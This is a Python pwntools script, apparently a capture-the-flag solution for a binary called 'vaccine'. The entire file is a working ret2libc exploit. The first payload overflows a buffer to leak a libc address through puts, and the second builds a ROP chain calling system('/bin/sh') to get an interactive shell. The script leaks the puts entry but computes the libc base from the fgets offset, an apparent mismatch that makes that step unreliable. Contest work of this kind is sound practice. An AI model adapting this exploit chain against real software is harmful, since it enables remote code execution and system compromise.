#!/usr/bin/env python3

from pwn import *
import binascii

context.terminal = ["tmux", "neww"]
exe = ELF("./vaccine/bin/vaccine")
context.binary = exe
libc = ELF("./libc-2.31.so")
# io = remote("vaccine-2.chal.ctf.acsc.asia", 1337)
# io = gdb.debug("./vaccine")
io = process("./vaccine/bin/vaccine")

rop = ROP(exe)
rdi = rop.rdi.address
ret = rop.ret.address

puts_got = exe.got["puts"]
puts_plt = exe.plt["puts"]
main_addr = exe.symbols["main"]

# pad = 0x100 - 0x90
# payload = b"ACGT" + b"\x00" * (pad - 4) + b"ACGT" + b"\x00" * 8

payload = flat({
    0: b"ACGT",
    0x100 - 0x90: b"ACGT",
    0x108: rdi,
    0x110: puts_got,
    0x118: puts_plt,
    0x120: main_addr,
}, filler=b"\x00" * 8)

io.sendlineafter(b"vaccine: ", payload)

log.info(io.recvline())
log.info(io.recvline())

leak = int(binascii.hexlify(io.recvline().strip()[::-1]), 16)

off = libc.symbols["fgets"]
libc.address = leak - off
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.symbols["system"]
log.info(hex(libc.address))
log.info(hex(bin_sh))
log.info(hex(system))

payload = flat({
    0: b"ACGT",
    0x100 - 0x90: b"ACGT",
    0x108: ret,
    0x110: rdi,
    0x118: bin_sh,
    0x120: system,
}, filler=b"\x00" * 8)

io.sendlineafter(b"vaccine: ", payload)

io.interactive()
